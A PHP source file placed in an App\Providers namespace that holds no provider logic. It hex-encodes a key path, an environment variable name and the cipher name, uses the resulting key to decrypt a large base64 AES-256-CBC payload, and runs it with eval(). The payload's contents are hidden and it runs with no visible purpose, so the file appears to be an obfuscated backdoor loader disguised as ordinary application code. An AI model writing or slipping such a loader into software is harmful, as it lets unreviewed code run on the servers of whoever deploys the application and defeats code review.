<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('hsB6gX7aM42pROb66zmjQQ==');

$c=base64_decode(

'2TfSRkfEjw38wD78to5zrSTx0oKrIQC5DruC+Dr1S1msjrh7iaXohT/Eyplch6dZ+ax2S4p69ZF+' .
'Slw1ceVlFD0t/bHXSZNZyPtd1E7/yyfYPbNdaa3bo8wwZSuszF5DZFAlheZ+UrUhfJ8Vk6rmQCPx' .
'tZjLZRef5VGfeplvYMen5rc5swI3cXkymKdUw3gAzkdX59iRGbaWynFUrWkUx4rmLssz4kN2WsUe' .
'ELktZFG0wCKHHjk2vGO5pF4wWLYm4W2et0V32ibW80jsn61m7xexzmWW+JU1aXRpbZI2HiCYtPeZ' .
'Qs0Xs3KpNujJPZsjkOYdhfNK/ddutcZWcC28PBDX27ZbtEVtj4TRBClUEX/BVi8UWLM3NCRfZZpu' .
'Tn8Y5LrLEfrTJGGS8ZrT7lDTCXdoXp5D+JQYNMHRISeeqya+bCTS5nzPJGZ7ibFIpi4KIX0FsWBW' .
'3YP9+OCEYu7tKuCkW41m8yaOeOH9X2mikyK/1zMX5dHtWgMWa6DRNEGUEx5GlEZwLLTjYEluIj6G' .
'2dC6XPWlOYFfeBrg3UgwweFod1LOI7ExoSrh79hdD5l1SD+4WajoNeDKfRv6EvtjN1bATbK79dJV' .
'yFS70Jwz82UzD/Dfrczkx1aeCgVSEc4ZYuORZo0RPNIJZvoklE+8A0aq3adJBnYcHEandTyoOIPg' .
's/ztZ34k5shuRlwYxPuvtwXZvnWuHqUozUCfBeILUwI8QMN1bhadUBDutaVzH9BDrwWC0xnHMu3u' .
'sIQu0puCsWVX5E0QVtrvOb6Kd1k/8YfsL3ntmgKCw7/8mygskouI3pSzFyJ0nMkKSQc3S+lKfeFK' .
'1JCDhcWT3WAWsB93JdQWBSkElnjshlNiTwqS6y/fQOUqkwXvL5PWQcRErs16BsyohGctfe0EFYlW' .
'D3Q3yKA2/0/d8ur467rF8bztC2kiOTwYxw0JKHvHGeUNph5FDb05WKYn66ectqCSCOZ6FGygCA/G' .
'kubQhHzOTCZOlbjzOYQiR2duc2J7U4LDRLrnkMW80/PD+KOq82/bkfjyYTLQNxCZ/kmHmsTFz17V' .
'/tNjiRx/d+EP8rpeEfpUUORl4fgreXOEsGDgNSYLnVeAFkjLMM0oxIV+3KlIA0leYgoo2MYN40Rf' .
's+bJGA4080zG+YmGNBwWo/39WUr2WlzR1vBZiS/3adViHjkglzYsSoaAwhZvk27RLzybnG3WKFzG' .
'TghEIQFAJjhqOb5TU9GpXAhLw49OEvnz5I3AXk7KpzFrMf/zq9KD9sMp+nREY6QeGbbt/KZJKrdu' .
'vdiqokRbzLsKmsTRVGFNY1k7wMiAH48z1XvrVdUqnilbm6WAzrjW1SBBwugB4yxf1rAXrt7QM98e' .
'ZNilGJRh2zw2UUUjtmJqkdqra4TIkH++0qWdj9z4ZSxeJ5TyDX8R5FDmu9dGEhcXc6I1WEkQyFOq' .
'a3zAGca5aH4CvxawiFbJdKEvHmzThjSEi1cTB6ZyYJtfZdeJnnbGqssyHbnroaOP1NE2eXYricQO' .
'Z83mB9HwYxpaSQssMckRX6SdFV95v6dmbC9pycqfyIIzL8MDa7T2pcKY3/KBjMPg3pc3t+/MmRBt' .
'DqNSrO4OeMIeEYvsWZTUdYDWz8onXdsaaMoFVcRC98nVrLw='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

